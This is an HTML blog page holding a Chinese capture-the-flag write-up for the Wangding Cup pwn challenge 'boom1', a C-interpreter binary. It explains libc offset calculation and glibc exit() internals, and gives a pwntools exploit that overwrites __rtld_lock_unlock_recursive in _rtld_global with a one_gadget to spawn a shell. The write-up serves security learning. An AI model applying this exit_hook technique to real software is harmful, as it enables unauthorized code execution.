@@ -1,0 +1,817 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head><meta name="generator" content="Hexo 3.9.0">
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      网鼎杯部分wp | Thriumph
+    
+  </title>
+  <meta name="author" content="Thriumph">
+  <meta name="keywords" content="pwn,re,渗透测试">
+  <meta name="description" content="不将就、不妥协、不停留">
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/Annie.css">
+  
+  <!-- jquery -->
+	<script src="/plugin/jquery/jquery.min.js"></script>
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'normal',
+      normalSrc: 'https://source.unsplash.com/collection/954550/1920x1080',
+      randomYouMax: 110,
+      randomYouSrc: '/',
+	  randomOtherSrc: '/',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: true,
+	  appId: 'kL7JiFr2neE843z5adAoDHih-gzGzoHsz',
+	  appKey: 'AsJ5lg1K8yyk6Rdo39i5dX1h',
+	  serverURLs: '' || ' '
+    }
+  </script>
+</head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「网鼎杯部分wp」
+		
+	</p>
+
+	
+	
+		<span id="star-button" rel="unlike">
+			<i class="icon-heart"></i>
+		</span>
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-zhihu"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-sina-weibo "></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-pinterest2"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/网鼎杯部分wp.html" itemprop="url">
+		网鼎杯部分wp
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/网鼎杯部分wp.html" itemprop="url">
+		<time datetime="2020-05-11T06:19:43.000Z" itemprop="dateUpdated">
+	  		2020-05-13
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/ctf/" class=" ">
+			ctf
+		</a>
+	
+		<a href="/tags/pwn/" class=" ">
+			pwn
+		</a>
+	
+		
+			</span>
+			
+			
+
+	
+    <span class="leancloud_visitors" id="/网鼎杯部分wp.html_visitors" data-url="/网鼎杯部分wp.html" data-title="网鼎杯部分wp">
+       	<i class="icon-eye"></i>
+       	热度
+        
+            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
+                   
+    </span>
+    
+
+
+
+	
+    <span class="leancloud_likes" id="/网鼎杯部分wp.html_likes" data-url="/网鼎杯部分wp.html" data-title="网鼎杯部分wp" rel="unlike">
+        <i class="icon-heart"></i>
+        喜欢
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+	
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>远程已经打不通了，远程的偏移和本地的偏移不一样，只能复现一下本地的了。</p>
+<p>首先看到流程图,代码量很大，有很大的switch语句和嵌套结构，可能是虚拟机或者是解析器。</p>
+<img src="/网鼎杯部分wp/1.png" style="zoom:67%;">
+
+<p>从下图看出是一个C语言的解析器。</p>
+<img src="/网鼎杯部分wp/2.png" style="zoom:67%;">
+
+<p>然后看了几个函数</p>
+<p>sub_B70解析了一些8，10，16进制数之类的。</p>
+<p>经过调试，发现需要定义main函数而且需要;结束，函数只能运行一次,有exit函数</p>
+<p><img src="/网鼎杯部分wp/3.png" alt></p>
+<p>ps：</p>
+<p>进程的内存会被分成几个段</p>
+<p>1.代码段（text）用于存放代码（指令）。</p>
+<p>2.数据段（data）用于存放初始化了的数据，如<code>int i = 10;</code>，就需要存放到数据段中。</p>
+<p>3.未初始化数据段（bss）用于存放未初始化的数据，如 <code>int i[1000];</code>，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。</p>
+<p>4.栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。</p>
+<p>5.堆（heap）用于为程序动态分配内存。</p>
+<p>在内存中的位置类似于下图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    stack   |     |      high address</span><br><span class="line">|    ...     v     |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|    ...     ^     |</span><br><span class="line">|    heap    |     |</span><br><span class="line">+------------------+</span><br><span class="line">| bss  segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| data segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| text segment     |      low address</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
+
+<p>其中的数据段我们只用来存放字符串，因为编译器并不支持初始化变量，因此我们也不需要未初始化数据段。当用户的程序需要分配内存时，理论上我们的虚拟机需要维护一个堆用于内存分配，但实际实现上较为复杂且与编译无关，故我们引入一个指令<code>MSET</code>，使我们能直接使用编译器中的内存。</p>
+<p>综上，需要首先在全局添加代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int *text,            // text segment</span><br><span class="line">    *old_text,        // for dump text segment</span><br><span class="line">    *stack;           // stack</span><br><span class="line">char *data;           // data segment</span><br></pre></td></tr></table></figure>
+
+<p>虽然是<code>int</code>型，但是是作为无符号的整型，因为我们会在代码段（text）中存放如指针/内存地址的数据，它们就是无符号的。其中数据段（data）由于只存放字符串，所以是 <code>char *</code> 型的。</p>
+<p>接着，在<code>main</code>函数中加入初始化代码，真正为其分配内存</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// allocate memory for virtual machine</span></span><br><span class="line">    <span class="keyword">if</span> (!(text = old_text = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for text area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(data = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for data area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">stack</span> = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for stack area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(text, <span class="number">0</span>, poolsize);</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, poolsize);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">stack</span>, <span class="number">0</span>, poolsize);</span><br><span class="line">    ...</span><br><span class="line">    program();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>c语言定义在main函数外的指针是在libc里的，拥有libc的地址。定义一个s，输入内容，让它拥有地址，然后打印出它的地址，得到两个地址的差就是偏移了。</p>
+<p><img src="/网鼎杯部分wp/10.png" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#r = remote('182.92.73.10',24573)</span></span><br><span class="line">context.log_level =<span class="string">'debug'</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">char *s;</span></span><br><span class="line"><span class="string">char *libcbase;</span></span><br><span class="line"><span class="string">char *p;</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    s = "aaaa";</span></span><br><span class="line"><span class="string">    printf("%p ", s);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = payload.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/网鼎杯部分wp/4.png" alt></p>
+<p><img src="/网鼎杯部分wp/5.png" alt></p>
+<p>s相对于libcbase的偏移为0x7ffff7f17028 - 0x7ffff7a0d000</p>
+<h2 id="计算exit-hook的偏移"><a href="#计算exit-hook的偏移" class="headerlink" title="计算exit_hook的偏移"></a>计算exit_hook的偏移</h2><p>gdb,用p _rtld_global</p>
+<p><img src="/网鼎杯部分wp/6.png" alt></p>
+<p>调整让[_rtld_global+8] == 0,这样s指向了rtld_global+8的位置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"aaaa"</span>;</span><br><span class="line">libcbase = s - (<span class="number">0x7ffff7f17028</span> - <span class="number">0x7ffff7a0d000</span>);</span><br><span class="line">s = libcbase + <span class="number">6229832</span> - <span class="number">3848</span> + <span class="number">8</span>;</span><br></pre></td></tr></table></figure>
+
+<p>让 * s = 0 即（*s ==s[0]）</p>
+<p>然后让s重新指向exit_hook</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s[0] = 0;</span><br><span class="line">s = libcbase + 6229832;</span><br></pre></td></tr></table></figure>
+
+<p>之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = libcbase + 0xcd0f3;</span><br><span class="line">s[0] = p&amp;0xff;</span><br><span class="line">s[1] = (p&gt;&gt;8)&amp;0xff;</span><br><span class="line">s[2] = (p&gt;&gt;16)&amp;0xff;</span><br></pre></td></tr></table></figure>
+
+<p>ps:</p>
+<p>exit_hook攻击</p>
+<p>更改exit()某一结构体,可以实现exit()函数的劫持</p>
+<p>exit()源代码</p>
+<p><img src="/网鼎杯部分wp/7.png" alt></p>
+<p>调用<code>__run_exit_handlers</code>函数,查看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> = &amp;<span class="title">cur</span>-&gt;<span class="title">fns</span>[--<span class="title">cur</span>-&gt;<span class="title">idx</span>];</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);    </span><br><span class="line">      <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);  </span><br><span class="line">      <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br></pre></td></tr></table></figure>
+
+<p>关键的三个call</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);    </span><br><span class="line"><span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);  </span><br><span class="line"><span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br></pre></td></tr></table></figure>
+
+<p>gdb动调有跳转</p>
+<img src="/网鼎杯部分wp/8.png" style="zoom:67%;">
+
+<p>调用了<code>_dl_fini</code>函数，查看<code>_dl_fini</code>函数源代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">#ifdef SHARED</span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">#endif</span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>
+
+<p>两个关键函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>
+
+<p><code>__rtld_lock_unlock_recursive</code>定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##namec</span></span><br></pre></td></tr></table></figure>
+
+<p>有<code>_rtld_global</code>结构体，p _rtld_global</p>
+<img src="/网鼎杯部分wp/9.png" style="zoom:67%;">
+
+<p>找到函数地址存放位置，则<code>__rtld_lock_unlock_recursive</code>为<code>_rtld_global</code>结构题的指针变量。在exit()中执行流程为<br><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code><br>由于<code>__rtld_lock_unlock_recursive</code>存放在结构体空间，为可读可写，那么如果可以修改<code>__rtld_lock_unlock_recursive</code>,就可以在调用exit()时劫持程序流。<br><code>_rtld_lock_lock_recursive</code>也是一样的流程。</p>
+<p>所以取出 libc里面的一个函数指针， 然后跳转过去， 写这个函数指针为 one_gadget , 然后调用exit 时就会拿到 shell。也就是将将_rtld_global结构体中的__rtld_unlock_recursive劫持为one_gadget就行。结构体在libc中，所需要一个字节一个字节的改，后三位改成one_gadget就能在执行exit函数时getshell了。</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r = process(&apos;./pwn&apos;)</span><br><span class="line">#r = remote(&apos;182.92.73.10&apos;,24573)</span><br><span class="line">context.log_level =&apos;debug&apos;</span><br><span class="line">gdb.attach(r)</span><br><span class="line">payload = &apos;&apos;&apos;</span><br><span class="line">char *s;</span><br><span class="line">char *libcbase;</span><br><span class="line">char *p;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    s = &quot;aaaa&quot;;</span><br><span class="line">	libcbase = s - (0x7ffff7f17028 - 0x7ffff7a0d000);</span><br><span class="line">	s = libcbase + 6229832 - 3848 + 8;</span><br><span class="line">	s[0] = 0;</span><br><span class="line">	s = libcbase + 6229832;</span><br><span class="line">	p = libcbase + 0xcd0f3;</span><br><span class="line">	s[0] = p&amp;0xff;</span><br><span class="line">	s[1] = (p&gt;&gt;8)&amp;0xff;</span><br><span class="line">	s[2] = (p&gt;&gt;16)&amp;0xff;</span><br><span class="line">	printf(&quot;%p &quot;, s);    </span><br><span class="line">&#125;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">payload = payload.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/网络设备配置与管理.html" title="网络设备配置与管理" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/数字中国创新大赛.html" title="数字中国创新大赛">
+								数字中国创新大赛			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 19日, 2020				
+							</p>
+							<p class="relate-post-content">
+								又是自闭的一天。。
+
+
+game这一题是关于python字节码的题目，之前没有了解过，看了几篇关于python字节码的文章，死磕，手工还原。。
+python字节码
+12345678910111213141516171819202122...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/数字中国创新大赛.html" title="数字中国创新大赛">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="数字中国创新大赛"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/hitcontraining-uaf.html" title="hitcontraining_uaf">
+								hitcontraining_uaf			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 22日, 2020				
+							</p>
+							<p class="relate-post-content">
+								一道简单的uaf的题目
+
+
+保护12345Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/hitcontraining-uaf.html" title="hitcontraining_uaf">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="hitcontraining_uaf"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/ez-pz-hackover-2016.html" title="ez_pz_hackover_2016">
+								ez_pz_hackover_2016			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 16日, 2020				
+							</p>
+							<p class="relate-post-content">
+								buu的一道pwn
+
+
+基本信息没有nx保护
+1234567ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpret...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/ez-pz-hackover-2016.html" title="ez_pz_hackover_2016">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ez_pz_hackover_2016"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	<script src="/plugin/clipboard/clipboard.js"></script>
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
